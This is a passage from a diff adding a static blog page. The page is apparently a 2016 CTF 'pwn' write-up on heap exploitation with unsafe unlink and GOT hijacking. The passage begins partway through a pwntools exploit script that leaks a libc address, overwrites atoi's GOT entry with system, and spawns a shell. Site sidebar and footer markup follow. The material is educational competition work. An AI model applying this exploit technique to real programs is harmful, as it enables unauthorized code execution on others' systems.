+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020c0</span><span class="p">)</span> <span class="c1"># for write arbitrary</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="c1"># let us be easy to renew</span>
+<span class="n">renew</span><span class="p">(</span><span class="s1">&#39;small&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">renew</span><span class="p">(</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># hijack free to call puts, * 2 to prevent origin puts broke</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020c0</span><span class="p">)</span> <span class="c1"># address of big_buf</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+<span class="n">renew</span><span class="p">(</span><span class="s1">&#39;small&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">wipe</span><span class="p">(</span><span class="s1">&#39;big&#39;</span><span class="p">)</span>
+
+<span class="n">x</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">x</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
+
+<span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020c0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+<span class="n">renew</span><span class="p">(</span><span class="s1">&#39;small&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">renew</span><span class="p">(</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span> <span class="c1"># GOT hijack</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+  </div>
+
+
+
+        </div>
+
+          <div class="col-md-3">
+  <div class="well">
+
+    <p><abbr title="2016-10-15T22:30:00+08:00"><i class="fa fa-calendar"></i> Sat 15 October 2016</abbr></p>
+
+      <p><address>
+        <i class="fa fa-user"></i> By
+          <a href="https://naetw.github.io/author/naetw.html" rel="author">Naetw</a>
+      </address></p>
+
+    <hr/>
+
+      <p>
+              <a href="https://naetw.github.io/category/write-up/" rel="tag"
+                  data-toggle="tooltip" class="label label-info"
+                  title="10 articles in this category">write-up</a>
+            <a href="/tag/ctf/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">CTF</a>
+            <a href="/tag/pwn/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">pwn</a>
+            <a href="/tag/heap/" data-toggle="tooltip"
+      class="label label-default"
+      title="5 articles with this tag">Heap</a>
+            <a href="/tag/got-hijacking/" data-toggle="tooltip"
+      class="label label-default"
+      title="4 articles with this tag">GOT Hijacking</a>
+            <a href="/tag/unsafe-unlink/" data-toggle="tooltip"
+      class="label label-default"
+      title="3 articles with this tag">Unsafe Unlink</a>
+            <a href="/tag/hitcon/" data-toggle="tooltip"
+      class="label label-default"
+      title="2 articles with this tag">HITCON</a>
+      </p>
+      <hr/>
+
+
+
+  </div>
+            
+          </div>
+
+      </div>
+
+    </div>
+
+    <!-- TODO: make footer sticky -->
+    <footer class="container-fluid">
+      <div class="container">
+        <div class="row">
+
+            <div class="col-md-2">
+                <h5>Social</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="https://github.com/Naetw">
+      <i class="fa fa-github"></i>
+    GitHub
+  </a></li>
+                </ul>
+            </div>
+            <div class="col-md-2">
+                <h5>Links</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="http://getpelican.com/">
+      <img src="https://besticon-demo.herokuapp.com/icon?url=getpelican.com&size=16" width="16" height="16" class="icon" alt="getpelican.com icon"/>
+    Pelican
+  </a></li>
+                </ul>
+            </div>
+
+          <div class="col-md-2">
+            <h5>Browse content by</h5>
+            <ul class="list-unstyled">
+                <li><a href="https://naetw.github.io/categories/index.html"><i class="fa fa-tags"></i> Categories</a></li>
+                <li><a href="https://naetw.github.io/archives/index.html"><i class="fa fa-calendar"></i> Dates</a></li>
+                <li><a href="https://naetw.github.io/tags/index.html"><i class="fa fa-tag"></i> Tags</a></li>
+            </ul>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Copyright notice</h5>
+            <p>© Copyright 2016-2017 Naetw.</p>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Disclaimer</h5>
+              <p>All opinions expressed in this site are my own personal opinions and are not endorsed by, nor do they represent the opinions of my previous, current and future employers or any of its affiliates, partners or customers.</p>
+          </div>
+
+          <div class="col-md-2">
+              <h5>Feeds</h5>
+              <ul class="list-unstyled">
+                  <li><small><a href="https://naetw.github.io/feeds/all.atom.xml"><i class="fa fa-rss"></i> All posts (Atom)</a></small></li>
+                  <li><small><a href="https://naetw.github.io/feeds/write-up.atom.xml"><i class="fa fa-rss"></i> Category: write-up (Atom)</a></small></li>
+              </ul>
+          </div>
+
+        </div>
+      </div>
+
+      <h5 class="text-right"><a href="#"><i class="fa fa-arrow-up"></i> Back to top</a></h5>
+
+      <div class="container">
+        <div class="row col-md-12 text-muted text-center">
+          Site generated by <a href="https://getpelican.com"> Pelican</a>.<br/>
+          <a href="https://github.com/kdeldycke/plumage"> Plumage</a> theme by <a href="https://kevin.deldycke.com">Kevin Deldycke</a>.
+        </div>
+      </div>
+
+    </footer>
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fitvids/1.1.0/jquery.fitvids.min.js"></script>
+    <script src="https://naetw.github.io/theme/js/jquery.mglass.js"></script>
+    <script src="https://naetw.github.io/theme/js/application.js"></script>
+
+  </body>
+</html>
